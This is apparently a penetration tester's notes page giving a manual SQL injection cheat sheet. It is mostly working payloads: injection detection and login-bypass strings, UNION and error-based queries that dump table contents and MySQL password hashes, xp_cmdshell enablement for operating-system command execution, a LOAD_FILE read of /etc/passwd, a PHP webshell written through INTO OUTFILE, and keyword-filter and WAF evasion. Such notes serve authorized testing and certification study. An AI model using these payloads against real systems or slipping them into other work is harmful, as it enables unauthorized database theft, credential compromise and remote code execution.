---
status: working
tags:
  - web
  - injection
  - sqli
---

> *Manual SQL Injection Reference:* Detection, authentication bypass, in-band and blind extraction, injection-to-RCE, and filter bypasses. Reach for this when a parameter or login field reaches a database and you want to hand-drive the injection, tune payloads around a filter, or work a target where an automated tool is a poor fit. `sqlmap` is the automated counterpart when it suits the engagement.

## Detection

Feed these one at a time into a suspected parameter and watch for errors or behavioral changes.

```sql
'                     -- error?  (single quote breaks the query)
''                    -- back to normal? confirms quote context
' OR '1'='1           -- classic true
1' AND '1'='1  vs  1' AND '1'='2     -- boolean differential (page differs = injectable)
1 AND 1=1  vs  1 AND 1=2             -- numeric context (no quotes)
'; WAITFOR DELAY '0:0:5'--           -- MSSQL time-based (blind)
' OR SLEEP(5)-- -                    -- MySQL time-based (blind)
' || pg_sleep(5)-- -                 -- Postgres time-based
```

> [!note]
> The boolean-differential pair is the core diagnostic. If `=1` and `=2` render differently, the input is reaching the query. Time-based payloads cover the blind case where you see no output but a five-second delay confirms execution. The time function also fingerprints the backend (`SLEEP` MySQL, `WAITFOR` MSSQL, `pg_sleep` Postgres).

## Authentication Bypass

Try these in the username field to comment out the password check or force the WHERE clause true.

```sql
' OR 1=1-- -            admin'-- -            admin'#            ' OR '1'='1'-- -
' OR 1=1 LIMIT 1-- -    ') OR ('1'='1         admin' OR 1=1-- -
```

> [!note]
> `admin'-- -` logs in as a specific known user by truncating the query right after the username. The `-- -` (with trailing space) and `#` are the two comment styles you reach for most.

## UNION Extraction (in-band)

The workhorse when output is reflected on the page. Ordered: count columns, find which reflect, then swap in real queries.

```sql
' ORDER BY 5-- -                                   -- find column count (increment until error)
' UNION SELECT 1,2,3,4,5-- -                        -- find which columns reflect on the page
' UNION SELECT 1,@@version,database(),user(),5-- -  -- MySQL: version/db/user
' UNION SELECT 1,table_name,3,4,5 FROM information_schema.tables WHERE table_schema=database()-- -
' UNION SELECT 1,column_name,3,4,5 FROM information_schema.columns WHERE table_name='users'-- -
' UNION SELECT 1,group_concat(user,0x3a,password),3,4,5 FROM users-- -
-- dump MySQL account hashes:
' UNION SELECT 1,group_concat(user,0x3a,authentication_string),3,4,5 FROM mysql.user-- -
-- if the column count mismatches, pad with NULLs:  ' UNION SELECT NULL,NULL,NULL-- -
```

> [!note]
> `information_schema` is the map of every table and column. `group_concat` collapses many rows into one reflected cell, and `0x3a` is a colon separator so the output reads `user:hash`. Any hashes you pull go to [[Hash Cracking]].

## Error-Based (output not reflected)

When UNION output is not visible but the page surfaces SQL errors, force the value into the error text.

```sql
-- MySQL extractvalue:
' AND extractvalue(1,concat(0x7e,(SELECT database())))-- -
-- MSSQL cast error leaks value:
' AND 1=CONVERT(int,(SELECT @@version))-- -
```

## Injection to RCE and File Operations

```sql
-- MSSQL command exec:
'; EXEC sp_configure 'show advanced options',1;RECONFIGURE;EXEC sp_configure 'xp_cmdshell',1;RECONFIGURE;-- -
'; EXEC xp_cmdshell 'whoami'-- -
-- MySQL read a local file:
' UNION SELECT LOAD_FILE('/etc/passwd'),2-- -
-- MySQL write a webshell (needs FILE priv + writable webroot + secure_file_priv off):
' UNION SELECT "<?php system($_GET['c']);?>",2 INTO OUTFILE '/var/www/html/sh.php'-- -
```

> [!note]
> `xp_cmdshell` runs OS commands as the SQL service account, which on Windows very often holds `SeImpersonate` and leads straight into [[Windows Privilege Escalation]]. `LOAD_FILE` reads any file the DB user can reach. `INTO OUTFILE` drops a webshell when FILE privilege and a known writable webroot line up, and is blocked when `secure_file_priv` is set.

## Filter and WAF Bypass

When keywords or characters get stripped, express the same query in a form the filter does not match but the database still parses.

```sql
-- comments to break keyword matching:
UN/**/ION SE/**/LECT      or   /*!50000UNION*/ /*!50000SELECT*/
-- case variation:            UnIoN SeLeCt
-- encode the quote/space:    %27  %20  %09(tab)  %0a(newline)  +   /**/
-- double-URL-encode:         %2527
-- inline whitespace swaps:   UNION(SELECT(1),2)     -- parentheses instead of spaces
-- comment terminators:       -- -   #   ;%00
-- "OR" filtered -> use ||    ; "=" filtered -> use LIKE or <>
```

> [!tip]
> The Burp workflow is capture the request, send to Repeater, mutate the injection point, and watch response length and status. Filters usually match exact keywords or characters, so the game is re-expressing the query rather than out-muscling the filter. Save the raw request to a file for the report.

## See Also

- [[Command Injection]] and [[File Upload]] for the other two common web-to-shell paths
- [[Hash Cracking]] for anything you dump
- [[Windows Privilege Escalation]] for the `xp_cmdshell` follow-on
- Source: [[OSCP Field Manual]] section 3.0
